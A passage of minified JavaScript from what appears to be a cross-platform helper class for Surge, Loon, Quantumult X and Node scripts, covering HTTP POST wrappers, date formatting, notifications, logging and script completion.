			if (t.body && t.headers && !t.headers["Content-Type"] && (t.headers["Content-Type"] = "application/x-www-form-urlencoded"), t.headers && delete t.headers["Content-Length"], this.isSurge() || this.isLoon())
				this.isSurge() && this.isNeedRewrite && (t.headers = t.headers || {}, Object.assign(t.headers, {
						"X-Surge-Skip-Scripting": !1
					})), $httpClient.post(t, (t, s, i) => {
					!t && s && (s.body = i, s.statusCode = s.status),
					e(t, s, i)
				});
			else if (this.isQuanX())
				t.method = "POST", this.isNeedRewrite && (t.opts = t.opts || {}, Object.assign(t.opts, {
						hints: !1
					})), $task.fetch(t).then(t => {
					const {
						statusCode: s,
						statusCode: i,
						headers: r,
						body: o
					} = t;
					e(null, {
						status: s,
						statusCode: i,
						headers: r,
						body: o
					}, o)
				}, t => e(t));
			else if (this.isNode()) {
				this.initGotEnv(t);
				const {
					url: s,
					...i
				} = t;
				this.got.post(s, i).then(t => {
					const {
						statusCode: s,
						statusCode: i,
						headers: r,
						body: o
					} = t;
					e(null, {
						status: s,
						statusCode: i,
						headers: r,
						body: o
					}, o)
				}, t => {
					const {
						message: s,
						response: i
					} = t;
					e(s, i, i && i.body)
				})
			}
		}
		time(t, e = null) {
			const s = e ? new Date(e) : new Date;
			let i = {
				"M+": s.getMonth() + 1,
				"d+": s.getDate(),
				"H+": s.getHours(),
				"m+": s.getMinutes(),
				"s+": s.getSeconds(),
				"q+": Math.floor((s.getMonth() + 3) / 3),
				S: s.getMilliseconds()
			};
			/(y+)/.test(t) && (t = t.replace(RegExp.$1, (s.getFullYear() + "").substr(4 - RegExp.$1.length)));
			for (let e in i)
				new RegExp("(" + e + ")").test(t) && (t = t.replace(RegExp.$1, 1 == RegExp.$1.length ? i[e] : ("00" + i[e]).substr(("" + i[e]).length)));
			return t
		}
		msg(e = t, s = "", i = "", r) {
			const o = t => {
				if (!t)
					return t;
				if ("string" == typeof t)
					return this.isLoon() ? t : this.isQuanX() ? {
						"open-url": t
					}
				 : this.isSurge() ? {
					url: t
				}
				 : void 0;
				if ("object" == typeof t) {
					if (this.isLoon()) {
						let e = t.openUrl || t.url || t["open-url"],
						s = t.mediaUrl || t["media-url"];
						return {
							openUrl: e,
							mediaUrl: s
						}
					}
					if (this.isQuanX()) {
						let e = t["open-url"] || t.url || t.openUrl,
						s = t["media-url"] || t.mediaUrl;
						return {
							"open-url": e,
							"media-url": s
						}
					}
					if (this.isSurge()) {
						let e = t.url || t.openUrl || t["open-url"];
						return {
							url: e
						}
					}
				}
			};
			if (this.isMute || (this.isSurge() || this.isLoon() ? $notification.post(e, s, i, o(r)) : this.isQuanX() && $notify(e, s, i, o(r))), !this.isMuteLog) {
				let t = ["", "==============📣系统通知📣=============="];
				t.push(e),
				s && t.push(s),
				i && t.push(i),
				console.log(t.join("\n")),
				this.logs = this.logs.concat(t)
			}
		}
		log(...t) {
			t.length > 0 && (this.logs = [...this.logs, ...t]),
			console.log(t.join(this.logSeparator))
		}
		logErr(t, e) {
			const s = !this.isSurge() && !this.isQuanX() && !this.isLoon();
			s ? this.log("", `❗️${this.name}, 错误!`, t.stack) : this.log("", `❗️${this.name}, 错误!`, t)
		}
		wait(t) {
			return new Promise(e => setTimeout(e, t))
		}
		done(t = {}) {
			const e = (new Date).getTime(),
			s = (e - this.startTime) / 1e3;
			this.log("", `🔔${this.name}, 结束! 🕛 ${s} 秒`),
			this.log(),
			(this.isSurge() || this.isQuanX() || this.isLoon()) && $done(t)
		}
	}
	(t, e)
}
